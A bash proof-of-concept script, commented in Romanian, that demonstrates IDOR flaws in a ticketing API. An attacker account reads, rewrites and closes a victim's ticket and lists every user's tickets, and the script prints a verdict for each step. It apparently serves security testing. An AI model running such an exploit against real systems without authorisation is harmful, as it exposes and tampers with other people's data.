#!/usr/bin/env bash
# poc/idor_tickets.sh
# Demonstreaza IDOR pe /api/tickets/{id} si /api/tickets (ListAll)

set +e
source "$(dirname "$0")/config.sh"

BASE="$BASE_URL"

# Configurare utilizatori
VICTIM_EMAIL="victim@yahoo.com"
VICTIM_PASS="Victim@123"
ATTACKER_EMAIL="attacker@yahoo.com"
ATTACKER_PASS="Attacker@123"

log() { echo "$*"; }

# login -> cookie session
login() {
  local email="$1" pass="$2" jar="$3"
  curl -s -c "$jar" -X POST "$BASE/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"$pass\"}" > /dev/null
}

VICTIM_JAR="/tmp/victim_cookies.txt"
ATTACKER_JAR="/tmp/attacker_cookies.txt"

log "=== IDOR PoC ==="
log ""

# 1: login 
log "Login victim"
login "$VICTIM_EMAIL" "$VICTIM_PASS" "$VICTIM_JAR"

log "Login attacker"
login "$ATTACKER_EMAIL" "$ATTACKER_PASS" "$ATTACKER_JAR"

# 2: victima isi creeaza un ticket 
log ""
log "Victima creeaza un ticket secret"
RESP="$(curl -s -b "$VICTIM_JAR" -X POST "$BASE/tickets" \
  -H "Content-Type: application/json" \
  -d '{"title":"Ticket secret","description":"Date sensibile aici","severity":"HIGH"}')"
echo "    Response: $RESP"

TICKET_ID="$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['ticket_id'])" 2>/dev/null)"
log "    Ticket creat cu ID: $TICKET_ID"

# 3: atacatorul citeste ticketul victimei (IDOR GET)
log ""
log "Atacatorul citeste ticketul victimei (GET /api/tickets/$TICKET_ID)"
CODE="$(curl -s -o /tmp/idor_get.json -w "%{http_code}" \
  -b "$ATTACKER_JAR" "$BASE/tickets/$TICKET_ID")"
echo "    Status: $CODE"
echo "    Body:   $(cat /tmp/idor_get.json)"

# 4: atacatorul modifica ticketul victimei (IDOR PUT)
log ""
log "Atacatorul modifica ticketul victimei (PUT /api/tickets/$TICKET_ID)"
CODE2="$(curl -s -o /tmp/idor_put.json -w "%{http_code}" \
  -b "$ATTACKER_JAR" -X PUT "$BASE/tickets/$TICKET_ID" \
  -H "Content-Type: application/json" \
  -d '{"title":"Salut","description":"modificat de atacator","severity":"LOW","status":"CLOSED"}')"
echo "    Status: $CODE2"
echo "    Body:   $(cat /tmp/idor_put.json)"

# 5: atacatorul listeaza TOATE ticketele 
log ""
log "Atacatorul listeaza toate ticketele (GET /api/tickets)"
CODE3="$(curl -s -o /tmp/idor_list.json -w "%{http_code}" \
  -b "$ATTACKER_JAR" "$BASE/tickets")"
COUNT="$(python3 -c "import sys,json; print(len(json.load(open('/tmp/idor_list.json'))))" 2>/dev/null)"
echo "    Status: $CODE3"
echo "    Tickete vizibile: $COUNT (ar trebui sa le vada doar pe ale lui)"

#Verdict
log ""
log "=== VERDICT ==="
[ "$CODE"  = "200" ] && log "[VULNERABIL] IDOR GET:  atacatorul a citit ticketul victimei"   || log "[OK] GET blocat"
[ "$CODE2" = "200" ] && log "[VULNERABIL] IDOR PUT:  atacatorul a modificat ticketul victimei" || log "[OK] PUT blocat"
[ "$CODE3" = "200" ] && log "[VULNERABIL] LIST ALL:  atacatorul vede toate ticketele"          || log "[OK] LIST blocat"